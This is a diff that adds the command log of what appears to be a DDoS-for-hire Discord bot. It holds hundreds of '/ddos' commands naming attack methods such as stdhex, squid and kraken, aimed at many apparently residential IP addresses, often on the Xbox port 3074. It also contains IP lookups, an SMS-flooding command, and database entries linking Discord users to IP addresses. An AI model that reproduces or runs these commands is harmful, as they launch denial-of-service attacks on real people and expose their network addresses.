@@ -1,0 +1,230 @@
+/Xboxcodd
+/xboxcode
+/vpn
+/xboxcode
+/ddos upd 68.35.38.112 60 80
+/ddos udp 68.35.38.112 60 80
+/ddos udp 68.35.38.112 1200 80
+/ddos stdhex 71.233.254.126 1200 80
+/ddos stdhex 69.131.231.16 300 80
+/ddos stdhex 68.0.238.151 200 80
+/methods
+/commands
+/checkip 71.121.214.96
+/ddos stdhex 137.119.180.63 1200 80
+/ddos stdhex 100.16.46.79 1200 80
+/ddos stdhex 68.134.60.139 1200 80
+/ddos stdhex 71.121.214.96 1200 80
+/sms 07477 168752 20
+/checkip 76.230.139.77
+/ddos stdhex 76.230.139.77 1200 80
+/checkip 73.42.233.17
+/ddos stdhex 73.42.233.17 1200 80
+/ddos stdhex 73.169.211.113 1200 80
+/ddos stdhex 73.74.196.243 300 80
+/ddos udpplain 23.82.14.34 1200 80
+/ddos udpplain 23.82.14.34 1200 334
+/methods
+/plan
+/ddos stdhex 71.190.209.178 1200 80
+/ddos stdhex 47.20.49.82 1200 80
+/checkip 71.190.209.178
+/commands
+/lag
+/lag stdhex 76.216.175.96 10 15 3 80
+/checkip 162.154.47.24
+/ddos stdhex 73.160.84.33 1200 80
+/ddos stdhex 73.160.84.33 1200 80
+/ddos stdhex 73.160.84.33 1200 80
+/ddos stdhex 73.160.84.33 1200 80
+/ddos stdhex 73.160.84.33 1200 80
+/ddos stdhex 73.160.84.33 1200 80
+/methods
+/ddos udpplain 74.119.146.234 1200 80
+/ddos udp 74.119.146.234 1200 80
+/ddos stdhex 74.119.146.234 1200 80
+/ddos udpplain 74.119.146.234 1200
+/ddos ovh-smash 74.119.146.234 1200
+/ddos stdhex 104.12.225.108 500
+/ddos stdhex 174.238.146.214 500
+/Xbox
+/methods
+/http
+/ddos http
+/ddos http 172.67.206.64 1200
+/ddos http 172.67.206.64 1200
+/ddos http 172.67.206.64 1200 80
+/checkip 128.116.114.3
+/ddos stdhex 73.74.196.243 1200
+/ddos stdhex 107.13.13.85 1200
+/ddos stdhex 67.176.196.182 1200
+/ddos stdhex 50.26.130.101 1200
+/ddos udpplain 185.229.59.159 1200
+/ddos stdhex 146.198.177.198 1200
+/ddos stdhex 86.153.191.92 1200
+/ddos stdhex 5.67.150.196 1200
+/ddos udpplain 38.132.103.150 1200
+/ping 38.132.103.150
+/ping 38.132.103.150
+/methods
+/ddos squid 69.112.250.79 1200
+/ddos squid 74.89.226.161 1200
+/ddos squid 74.89.226.161 1200
+/ddos squid 69.112.250.79 1200
+/plan
+/ddos squid 69.136.130.20 1200
+/ddos stdhex 69.136.130.20 1200
+/vpn
+/ping 98.183.71.184
+/ddos squid 107.13.13.85 1200
+/ddos squid 79.72.51.172 180
+/ddos squid 94.10.84.223 600
+/ddos squid 78.148.109.131 1200 3074
+/ddos squid 98.196.100.19 1200
+/ddos squid 97.114.107.16 1200
+/ddos squid 108.66.94.194 1200
+/ddos squid 98.224.199.104 1200 3074
+/ddos squid 98.180.87.69 1200 3074
+/checkip 68.8.168.119
+/checkip 162.248.88.85
+/ddos squid 97.85.153.206 1200 80
+/ddos squid 189.202.75.126 1200 80
+/ddos squid 189.202.75.126 1200 3074
+/methods
+/ddos squid 189.202.75.126 1200 3074
+/ddos squid 108.173.243.126 300 3074
+/ddos squid 86.18.106.168 300 3074
+/ddos squid 47.13.144.23 1200
+/plan
+/methods
+/ddos
+/ddos ovh-smash 158.69.156.168 300
+/ddos 76.223.228.90 1200
+/ddos squid 76.223.228.90 1200
+/ddos squid 99.166.167.185 1200
+/ddos squid 73.244.219.77 1200
+/ddos squid 74.211.52.186 1200
+/ddos squid 65.245.187.199 1200
+/plan
+/ddos squid 69.124.64.45 1200
+/methods
+/ddos std 76.184.4.94 1200 80
+/ddos Godzilla std 76.184.4.94 1200 80
+/ddos kraken squid 24.1.90.252 1200
+/ddos kraken squid 76.184.4.94 1200
+/ddos Godzilla std 24.1.90.252 1200
+/ddos godzilla std 24.1.90.252 1200
+/ddos kraken squid 96.248.43.55 100
+/ddos kraken squid 100.40.151.235 300
+/ddos kraken squid 96.248.43.55 300
+/ddos godzilla 23.119.134.146 1200 80
+/ddos 23.119.134.146 godzilla 1200 80
+/ddos kraken squid 23.119.134.146 1200 80
+/ddos kraken squid 23.119.134.146 1200 80
+/ddos kraken squid 23.119.134.146 1200 80
+/ddos kraken squid 23.119.134.146 1200 80
+/ddos kraken squid 86.16.52.82 1200
+/ddos kraken squid 23.119.134.146 1200 80
+/ddos kraken squid 23.119.134.146 1200 80
+/ddos kraken squid 23.119.134.146 1200 80
+/ddos kraken squid 23.119.134.146 1200 80
+/ddos kraken squid 23.119.134.146 1200 80
+/ddos kraken squid 23.119.134.146 1200 80
+/ddos kraken squid 23.122.29.73 1000 80
+/ddos kraken squid 23.122.29.73 1000 80
+/ddos kraken squid 23.122.29.73 1000 3074
+/ping 23.122.29.73
+/xboxcode
+/xboxcode
+/xboxcode l
+/xboxcode
+/ddos kraken squid 71.58.146.69 1200 80
+/ddos kraken squid 71.58.146.69 1200 80
+/ddos kraken squid 71.161.235.205 1200 80
+/ddos kraken squid 207.81.21.49 1200 80
+/ddos kraken squid 71.161.235.205 1200
+/ddos kraken squid 71.161.235.205 1200 3074
+/ping 71.161.235.205
+/ddos kraken squid 71.161.235.205 1200 3074
+/ddos kraken squid 71.161.235.205 1200 3074
+/ddos kraken squid 70.180.29.252 1200 80
+/ping 70.180.29.252
+/ddos kraken squid 70.180.29.252 1200 80
+/ping 70.180.29.252
+/ping 70.180.29.252
+/ddos kraken vse 70.180.29.252 1200 80
+/ping 70.180.29.252
+/ping 70.180.29.252
+/ping 70.180.29.252
+/ping 70.180.29.252
+/ping 70.180.29.252
+/ping 70.180.29.252
+/plan
+/plan
+/ddos kraken squid 99.6.213.149 1200
+/ddos kraken squid 68.77.41.92 1200
+/ddos kraken squid 74.136.4.5 1200
+/ddos kraken squid 74.136.4.5 1200
+/ddos kraken squid 147.253.226.84 600
+/ddos kraken squid 147.253.226.84 1200
+/ping 147.253.226.84
+/ping 147.253.226.84
+/ddos kraken squid 68.227.166.180 1200
+/
+/ddos kraken squid 68.227.166.180 600
+/ping 68.227.166.180
+/plan
+/ddos kraken squid 162.203.21.35 120
+/ping 162.203.21.35
+/ddos kraken squid 73.21.111.170 300
+/ddos kraken squid 47.220.59.115 1200
+/ddos kraken squid 67.20.238.136 1200
+/ddos kraken squid 154.5.141.66 1200
+/ddos kraken squid 154.5.141.66 1200
+/ddos kraken squid 176.254.73.197 600
+/ddos kraken squid 90.213.190.40 1200
+/ping 90.213.190.40
+/ddos kraken squid 173.22.234.49 600
+/ddos kraken squid 24.125.245.222 1200
+/ddos kraken squid 64.130.156.233 500
+/ddos kraken squid 64.130.157.172 300
+/ddos kraken squid 24.53.93.34 400
+/ddos kraken squid 173.94.79.176 400
+/ddos kraken squid 174.19.31.143 1200
+/ddos kraken squid 68.35.41.39 1200
+/ddos kraken squid 64.53.152.137 1200
+/ddos kraken squid 99.23.91.147 1200
+/plan
+/ddos kraken squid 75.169.182.108 600
+/ddos kraken squid 104.190.190.215 1200
+/checkip 104.190.190.215
+/ddos kraken squid 104.190.190.215 1200 80
+/ddos kraken squid 75.169.182.108 1200
+/methods
+/ddos kraken nfo-down 104.190.190.215 120
+/ddos kraken squid 75.169.157.190 1200
+/ddos kraken squid 23.122.29.73 300 80
+/ping 23.12229.73
+/ping 23.122.29.73
+/ping 23.122.29.73
+/plan
+/claim PLPAamTB3EP9CoqqA6MUV73UsGSrtaW3jR5Lco3VsgAfINf87R
+[Fri Aug 14 2020 08:32:13 GMT-1100 (Samoa Standard Time)] /ping 170.211.105.6
+[Sat Aug 22 2020 05:22:06 GMT-1100 (Samoa Standard Time)] /getplan 687375591506575375
+[Sat Aug 22 2020 06:24:53 GMT-1100 (Samoa Standard Time)] /dbsearch <@698451241667133502>
+[Sat Aug 22 2020 06:25:12 GMT-1100 (Samoa Standard Time)] /dbsearch <@451807975909359616>
+[Sat Aug 22 2020 06:25:53 GMT-1100 (Samoa Standard Time)] /dbsearch Cough
+[Sat Aug 22 2020 06:26:16 GMT-1100 (Samoa Standard Time)] /dbget Getti
+[Sat Aug 22 2020 06:26:30 GMT-1100 (Samoa Standard Time)] /dbget getto
+[Sat Aug 22 2020 06:27:19 GMT-1100 (Samoa Standard Time)] /dbget GETTO#3706
+[Sat Aug 22 2020 06:28:03 GMT-1100 (Samoa Standard Time)] /dbget Cough#9437
+[Sat Aug 22 2020 06:30:51 GMT-1100 (Samoa Standard Time)] /getdb TR4P#1010
+[Sat Aug 22 2020 06:31:06 GMT-1100 (Samoa Standard Time)] /dbget TR4P#1010
+[Sat Aug 22 2020 06:32:02 GMT-1100 (Samoa Standard Time)] /dbadd Cough#9437:1.1.1.1
+[Sat Aug 22 2020 07:02:42 GMT-1100 (Samoa Standard Time)] /checkip 166.182.255.106
+[Sat Aug 22 2020 10:55:32 GMT-1100 (Samoa Standard Time)] /Hulu
+[Sat Aug 22 2020 10:55:59 GMT-1100 (Samoa Standard Time)] /hulu
+[Sat Aug 22 2020 13:25:18 GMT-1100 (Samoa Standard Time)] /hulu
+[Sun Aug 23 2020 15:13:35 GMT-1100 (Samoa Standard Time)] /getplan 714247184622813224
+[Sun Aug 23 2020 15:15:56 GMT-1100 (Samoa Standard Time)] /plan
+[Sun Aug 23 2020 15:16:54 GMT-1100 (Samoa Standard Time)] /getplan <@688760216124391449>
